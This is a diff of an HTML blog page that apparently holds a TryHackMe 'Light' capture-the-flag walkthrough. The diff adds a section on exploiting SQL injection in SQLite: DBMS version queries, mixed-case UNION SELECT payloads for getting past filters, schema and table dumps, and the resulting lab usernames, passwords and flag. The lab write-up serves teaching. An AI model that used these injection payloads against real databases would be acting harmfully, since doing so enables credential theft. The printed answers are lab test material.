@@ -24,10 +24,18 @@
 <meta property="og:description" content="THM - Light Walkthrough">
 <meta property="og:locale" content="es_ES">
 <meta property="og:image" content="http://meliod4rk.github.io/img/Walkthrough/THM/Light/smokey_connection.png">
+<meta property="og:image" content="http://meliod4rk.github.io/img/Walkthrough/THM/Light/filters_bypass.png">
+<meta property="og:image" content="http://meliod4rk.github.io/img/Walkthrough/THM/Light/tables.png">
+<meta property="og:image" content="http://meliod4rk.github.io/img/Walkthrough/THM/Light/dump_usertable.png">
+<meta property="og:image" content="http://meliod4rk.github.io/img/Walkthrough/THM/Light/dump_admintable.png">
+<meta property="og:image" content="http://meliod4rk.github.io/img/Walkthrough/THM/Light/task1_result.png">
 <meta property="article:published_time" content="2025-03-03T11:02:52.000Z">
-<meta property="article:modified_time" content="2025-03-03T13:09:32.677Z">
+<meta property="article:modified_time" content="2025-03-03T17:35:09.904Z">
 <meta property="article:author" content="MelioD4rk">
+<meta property="article:tag" content="Walkthrough">
+<meta property="article:tag" content="THM">
 <meta property="article:tag" content="Lab">
+<meta property="article:tag" content="SQLI">
 <meta name="twitter:card" content="summary_large_image">
 <meta name="twitter:image" content="http://meliod4rk.github.io/img/Walkthrough/THM/Light/smokey_connection.png">
   
@@ -198,7 +206,7 @@
   
     <span class="post-meta mr-2">
       <i class="iconfont icon-chart"></i>
-      1.9k wc
+      3.2k wc
     </span>
   
 
@@ -275,6 +283,100 @@
 
 <p>Now, we <strong>know</strong> that this DBMS is vulnerable to SQL Injection.</p>
 <p>Let’s move on to the <strong>exploitation</strong> phase of this vulnerability! :)</p>
+<h3 id="5-Discovery-SQL-Injection-SQLi"><a href="#5-Discovery-SQL-Injection-SQLi" class="headerlink" title="5. Discovery - SQL Injection (SQLi)"></a>5. Discovery - SQL Injection (SQLi)</h3><p>Now is time to get information such as ddbb version, tables, columns, etc.<br>So, to do that, we will use some commands to get DBMS type and version:</p>
+<table>
+<thead>
+<tr>
+<th>Oracle</th>
+<th><code>SELECT banner FROM v$versionSELECT version FROM v$instance</code></th>
+</tr>
+</thead>
+<tbody><tr>
+<td>Microsoft</td>
+<td><code>SELECT @@version</code></td>
+</tr>
+<tr>
+<td>PostgreSQL</td>
+<td><code>SELECT version()</code></td>
+</tr>
+<tr>
+<td>MySQL</td>
+<td><code>SELECT @@version</code></td>
+</tr>
+<tr>
+<td>SQLite</td>
+<td><code>SELECT sqlite_version()</code></td>
+</tr>
+</tbody></table>
+<p>As shown on following image, we tested the system to find which sql command can bypass the filters and get de SQLite DBMS version:</p>
+<p>(insert photo)<br><img src="/img/Walkthrough/THM/Light/filters_bypass.png" srcset="/img/Website/loading.gif" lazyload alt="Figure 2: Filters Bypass"></p>
+<p>Jumping to the end of retries, this is the command i used to bypass filters and extract db_schema and list created tables on it and they attributes (i had to (escribir los comandos combinando mayusculas y minusculas -&gt; me gustaria saber el nombre tecnico de esta tecnica)):</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-string">&#x27; UniOn SeLeCt group_concat(sql) FROM sqlite_master&#x27;</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="/img/Walkthrough/THM/Light/tables.png" srcset="/img/Website/loading.gif" lazyload alt="Figure 3: DBMS table schema"></p>
+<p>Finally, we could dump tables data with the following one:</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-string">&#x27; UniOn SeLeCt group_concat(&lt;column_name&gt;) FROM &lt;table_name&gt;&#x27;</span><br></code></pre></td></tr></table></figure>
+<p><img src="/img/Walkthrough/THM/Light/dump_usertable.png" srcset="/img/Website/loading.gif" lazyload alt="Figure 4: Dump usertable"><br><img src="/img/Walkthrough/THM/Light/dump_admintable.png" srcset="/img/Website/loading.gif" lazyload alt="Figure 5: Dump admintable"></p>
+<p>Thanks to above steps, we could understand results obtained by query command:</p>
+<p><strong>usertable</strong></p>
+<table>
+<thead>
+<tr>
+<th>username</th>
+<th>password</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>alice</td>
+<td>tF8tj2o94WE4LKC</td>
+</tr>
+<tr>
+<td>rob</td>
+<td>yAn4fPaF2qpCKpR</td>
+</tr>
+<tr>
+<td>john</td>
+<td>e74tqwRh2oApPo6</td>
+</tr>
+<tr>
+<td>michael</td>
+<td>7DV4dwA0g5FacRe</td>
+</tr>
+<tr>
+<td>smokey</td>
+<td>vYQ5ngPpw8AdUmL</td>
+</tr>
+<tr>
+<td>hazel</td>
+<td>EcSuU35WlVipjXG</td>
+</tr>
+<tr>
+<td>ralph</td>
+<td>YO1U9O1m52aJImA</td>
+</tr>
+<tr>
+<td>steve</td>
+<td>WObjufHX1foR8d7</td>
+</tr>
+</tbody></table>
+<p><strong>admintable</strong></p>
+<table>
+<thead>
+<tr>
+<th>username</th>
+<th>password</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>TryHackMeAdmin</td>
+<td>mamZtAuMlrsEy5bp6q17</td>
+</tr>
+<tr>
+<td>flag</td>
+<td>THM{SQLit3_InJ3cTion_is_SimplE_nO?}</td>
+</tr>
+</tbody></table>
+<h3 id="6-Solution"><a href="#6-Solution" class="headerlink" title="6. Solution"></a>6. Solution</h3><p>Finally, with the gathered information, we could respond to thm ctf questions.<br><img src="/img/Walkthrough/THM/Light/task1_result.png" srcset="/img/Website/loading.gif" lazyload alt="Figure 6: Task 1 solution"></p>
 
             </div>
             <hr>
@@ -294,7 +396,13 @@
                   <div class="post-meta">
                     <i class="iconfont icon-tags"></i>
                     
+                      <a class="hover-with-bg" href="/tags/Walkthrough/">Walkthrough</a>
+                    
+                      <a class="hover-with-bg" href="/tags/THM/">THM</a>
+                    
                       <a class="hover-with-bg" href="/tags/Lab/">Lab</a>
+                    
+                      <a class="hover-with-bg" href="/tags/SQLI/">SQLI</a>
                     
                   </div>
                 
@@ -377,7 +485,7 @@
 
   <footer class="text-center mt-5 py-3">
   <div class="footer-content">
-     <i class="iconfont icon-github-fill"></i> <a href="https://github.com/Melioda5" target="_blank" rel="nofollow noopener"><span>Melioda5</span></a> 
+     <i class="iconfont icon-github-fill"></i> <a href="https://github.com/MelioD4rk" target="_blank" rel="nofollow noopener"><span>MelioD4rk</span></a> 
   </div>
   
 
